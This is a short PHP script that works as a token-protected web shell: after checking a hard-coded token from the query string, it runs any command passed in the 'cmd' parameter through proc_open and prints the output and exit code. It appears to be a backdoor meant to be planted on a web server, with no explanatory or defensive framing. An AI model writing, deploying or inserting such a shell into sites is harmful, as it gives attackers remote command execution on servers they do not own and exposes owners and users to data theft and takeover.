<?php
$token = 'ad3a846139864a938057a9febba81824';
if (!isset($_GET['token']) || !hash_equals($token, $_GET['token'])) {
  http_response_code(403);
  echo 'forbidden';
  exit;
}
$cmd = $_POST['cmd'] ?? $_GET['cmd'] ?? 'pwd';
header('Content-Type: text/plain; charset=utf-8');
echo "CMD> ".$cmd."\n---\n";
$descriptors = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
$p = proc_open($cmd, $descriptors, $pipes, '/home/wghk7piw6ajn');
if (is_resource($p)) {
  echo stream_get_contents($pipes[1]);
  fclose($pipes[1]);
  echo stream_get_contents($pipes[2]);
  fclose($pipes[2]);
  echo "\nEXIT=".proc_close($p)."\n";
} else {
  echo 'proc_open failed';
}
